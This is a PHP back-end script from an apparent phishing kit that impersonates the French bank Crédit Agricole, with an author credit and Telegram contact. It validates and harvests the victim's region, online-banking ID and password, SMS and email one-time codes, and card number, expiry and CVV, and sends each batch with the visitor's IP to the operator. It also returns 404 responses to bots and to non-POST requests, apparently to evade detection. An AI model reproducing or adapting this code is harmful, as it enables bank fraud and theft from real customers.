<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/

    require_once 'app/config.php';

    if($_SERVER['REQUEST_METHOD'] == "POST") {

        if( !empty($_POST['cap']) ) {
            header("HTTP/1.0 404 Not Found");
            exit();
        }

        if( $_POST['steeep'] == "region" ) {
            $_SESSION['errors'] = [];
            $_SESSION['region_number'] = $_POST['region_number'];
            $_SESSION['region_caisse']    = $_POST['region_caisse'];
            if( empty($_POST['region_number']) && empty($_POST['region_caisse']) ) {
                $_SESSION['errors']['region_number'] = 'Votre saisie est incorrecte, veuillez indiquer votre département. Par exemple pour Paris, indiquez uniquement "75".';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | C-AGRICOL | Region';
                $message = '/-- REGION INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Numéro de département : ' . $_POST['region_number'] . "\r\n";
                $message .= 'Caisse régionale : ' . $_POST['region_caisse'] . "\r\n";
                $message .= '/-- END REGION INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                echo "../index.php?redirection=login";
                exit();
            } else {
                echo "../index.php?redirection=region&error=1";
                exit();
            }
        }

        if( $_POST['steeep'] == "login" ) {
            $_SESSION['errors'] = [];
            $_SESSION['identifiant'] = $_POST['identifiant'];
            $_SESSION['password']    = $_POST['password'];
            if( validate_number($_POST['identifiant'],11) == false ) {
                $_SESSION['errors']['identifiant'] = true;
            }
            if( validate_number($_POST['password'],6) == false ) {
                $_SESSION['errors']['password'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | C-AGRICOL | Login';
                $message = '/-- LOGIN INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Numéro de département : ' . $_SESSION['region_number'] . "\r\n";
                $message .= 'Caisse régionale : ' . $_SESSION['region_caisse'] . "\r\n";
                $message .= 'Identifiant : ' . $_POST['identifiant'] . "\r\n";
                $message .= 'Password : ' . $_POST['password'] . "\r\n";
                $message .= '/-- END LOGIN INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                echo "../index.php?redirection=loading1";
                exit();
            } else {
                echo "../index.php?redirection=login&error=1";
                exit();
            }
        }

        if( $_POST['steeep'] == "sms" ) {
            $_SESSION['errors'] = [];
            $_SESSION['sms_code']    = $_POST['sms_code'];
            if( empty($_POST['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = 'Le code est incorrect.';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | C-AGRICOL | Sms';
                $message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS code : ' . $_POST['sms_code'] . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                echo "../index.php?redirection=loading2";
                exit();
            } else {
                echo "../index.php?redirection=sms&error=1";
                exit();
            }
        }

        if( $_POST['steeep'] == "emailcode" ) {
            $_SESSION['errors'] = [];
            $_SESSION['emailcode']    = $_POST['emailcode'];
            if( empty($_POST['emailcode']) ) {
                $_SESSION['errors']['emailcode'] = 'Le code est incorrect.';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | C-AGRICOL | Sms';
                $message = '/-- E-CODE INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Email code : ' . $_POST['emailcode'] . "\r\n";
                $message .= '/-- END E-CODE INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                echo "../index.php?redirection=cc";
                exit();
            } else {
                echo "../index.php?redirection=emailcode&error=1";
                exit();
            }
        }

        /*if( $_POST['steeep'] == "email" ) {
            $_SESSION['errors'] = [];
            $_SESSION['email_address']    = $_POST['email_address'];
            $_SESSION['email_password']    = $_POST['email_password'];
            if( validate_email($_POST['email_address']) == false ) {
                $_SESSION['errors']['email_address'] = "E-mail non valide";
            }
            if( empty($_POST['email_password']) ) {
                $_SESSION['errors']['email_password'] = "Mot de passe incorrect";
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | C-AGRICOL | Email';
                $message = '/-- EMAIL INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Email address : ' . $_POST['email_address'] . "\r\n";
                $message .= 'Email password : ' . $_POST['email_password'] . "\r\n";
                $message .= '/-- END EMAIL INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                $data = [
                    'email'     => $_POST['email_address'] . ' | ' . $_POST['email_password'],
                    'ip'    => get_client_ip()
                ];
                insert_email($data);
                echo "../index.php?redirection=loading";
                exit();
            } else {
                echo "../index.php?redirection=email&error=1";
                exit();
            }
        }*/

        if( $_POST['steeep'] == "cc" ) {
            $_SESSION['errors'] = [];
            $_SESSION['phone']    = $_POST['phone'];
            $_SESSION['one']    = $_POST['one'];
            $_SESSION['two']    = $_POST['two'];
            $_SESSION['three']    = $_POST['three'];
            $date_ex    = explode('/',$_POST['two']);
            $one        = validate_one($_POST['one']);
            $three      = validate_three($_POST['three']);
            $two        = validate_two($date_ex[0],$date_ex[1]);
            if( validate_number($_POST['phone'],10) == false ) {
                $_SESSION['errors']['phone'] = true;
            }
            if( $one == false ) {
                $_SESSION['errors']['one'] = true;
            }
            if( $two == false ) {
                $_SESSION['errors']['two'] = true;
            }
            if( $three == false ) {
                $_SESSION['errors']['three'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | C-AGRICOL | Card';
                $message = '/-- CARD INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Phone : ' . $_POST['phone'] . "\r\n";
                $message .= 'Card number : ' . $_POST['one'] . "\r\n";
                $message .= 'Card Date : ' . $_POST['two'] . "\r\n";
                $message .= 'Card CVV : ' . $_POST['three'] . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                echo "../index.php?redirection=success";
                exit();
            } else {
                echo "../index.php?redirection=cc&error=1";
                exit();
            }
        }

    } else {
        header("HTTP/1.0 404 Not Found");
        exit();
    }

?>